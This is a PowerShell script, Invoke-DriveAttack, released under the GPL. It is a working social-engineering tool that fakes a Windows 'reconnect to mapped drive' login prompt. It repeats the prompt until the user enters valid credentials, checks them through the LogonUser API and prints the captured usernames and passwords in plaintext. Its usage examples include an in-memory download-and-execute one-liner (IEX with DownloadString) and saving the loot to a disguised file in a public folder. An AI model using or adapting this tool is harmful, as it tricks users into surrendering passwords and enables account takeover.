#requires -Version 2
<#
        # All credit to the original author(s): Ryan Watson (Watson0x90)
        #
        # Invoke-DriveAttack.ps1 is free software: you can redistribute it and/or modify
        # it under the terms of the GNU General Public License as published by
        # the Free Software Foundation, either version 3 of the License, or
        # (at your option) any later version.
        #
        # Invoke-DriveAttack.ps1 is distributed in the hope that it will be useful,
        # but WITHOUT ANY WARRANTY; without even the implied warranty of
        # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        # GNU General Public License for more details.
        #
        # You should have received a copy of the GNU General Public License
        # along with Invoke-DriveAttack.ps1.  If not, see <http://www.gnu.org/licenses/>.

#>
            
Function Invoke-DriveAttack
{
    <#
            .SYNOPSIS 
            
            Social engineering attack prompting users re-enter credentials for 
            a mapped drive on their computer. This will perform a check till valid 
            workstation or domain creds are entered. Output will return both valid and unvalid credentials.
            This script has been tested on Windows 7, Windows 8.1, and Windows 10

            The following should be considered:
            1) The user is active
            2) There are mapped drives on the host

            Example Output:

            Domain    CredentialDomain   Username   Password  Valid
            ------    ----------------   --------   --------  -----
            MyDomain  MyDomain           user       P@ssword  False
            MyDomain  DifferentDomain    admin      P@ssword  True
            
            .Description 
            
            Social engineering attack prompting users re-enter credentials for a mapped drive on their computer.

            .Example

            Invoke-DriveAttack -drive R -retries 3

            Invoke-DriveAttack -drive R -verify $false
	
            Invoke-DriveAttack -drive T -retries 3 | Out-File C:\users\public\libraries\tmp.library-ms
            
            IEX (New-Object net.webclient).downloadstring('https://raw.githubusercontent.com/watson0x90/PowerShell-Scripts/master/Invoke-DriveAttack.ps1'); Invoke-DriveAttack -Drive D -verify $false;
    #>
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory = $true)]
        [string]
        $Drive,
        
        [Parameter(Mandatory = $false)]
        [int]
        $retries = 3,
        
        [Parameter(Mandatory = $false)]
        [bool]
        $verify = $true

    )
    

    $ErrorActionPreference = 'SilentlyContinue'
   
    
    $logonUserWin32 = '[System.Runtime.InteropServices.DllImport("advapi32.dll")] public static extern bool LogonUser(string userName, string domainName, string password, int LogonType, int LogonProvider,ref IntPtr phToken);'

    Add-Type -MemberDefinition $logonUserWin32 -Name NativeMethods -Namespace Win32
 
    function Test-Credentials
    {
        Param($username,$password,$domain)
        [IntPtr]$userToken = [Security.Principal.WindowsIdentity]::GetCurrent().Token
   
        $valid = [Win32.NativeMethods]::LogonUser( $username,$domain,$password, 2, 0, [ref]$userToken)

        if($valid)
        {
            return $true
        }
        else
        {
            return $false
        }
    }

    function Error-BadCredentialsPrompt
    {
        $wshell = New-Object -ComObject Wscript.Shell
        $wshell.Popup('Bad Username or Password',0,'Failed Authentication',0x0+0x10)
    }
          
    $Drive = $Drive + ':\'		
    $credentials = @()
    $retryCount = 0
    $ValidCreds = $false

    Do
    {
        if($cred = $host.ui.promptforcredential('Reconnect to '+$Drive,'Windows is unable to access '+$Drive+'                                     Authentication Required. ',$env:UserDomain + '\' + $env:UserName,$env:UserDomain))
        {

        }
        else
        {
            '!! User Canceled Prompt !!'
            break
        }
        				
        $UserDefDomain = $cred.GetNetworkCredential().Domain
        $username = $cred.GetNetworkCredential().UserName
        $password = $cred.GetNetworkCredential().Password
        $CurrentDomain = $env:UserDomain
        $UserCancel = $cred	
        
        if($verify)
        {
            $isValid = Test-Credentials -username $username -password $password -domain $UserDefDomain
        }
        else
        {
            $isValid = $true
        }
				
        if($isValid -eq $false)
        {
            $credentialsTemp = New-Object -TypeName psobject -Property @{
                Domain           = $CurrentDomain
                CredentialDomain = $UserDefDomain
                Username         = $username
                Password         = $password
                Valid            = $false
            }
            $credentials += $credentialsTemp
            $retryCount++
            if($retryCount -eq $retries)
            {
                $retryPrompt = Error-BadCredentialsPrompt
                '[!!] Retry count Reached [!!]'
                break
            }
        }
        else
        {
            $credentialsTemp = New-Object -TypeName psobject -Property @{
                Domain           = $CurrentDomain
                CredentialDomain = $UserDefDomain
                Username         = $username
                Password         = $password
                Valid            = $verify
            }
            $credentials += $credentialsTemp
            $ValidCreds = $true
        }
    }
    While($ValidCreds -eq $false)
    if($credentials -ne $null)
    {
        '[##] Credentials [##]'
        $credentials |
        Select-Object -Property Domain, CredentialDomain, Username, Password, Valid |
        Format-Table -AutoSize
    }
}
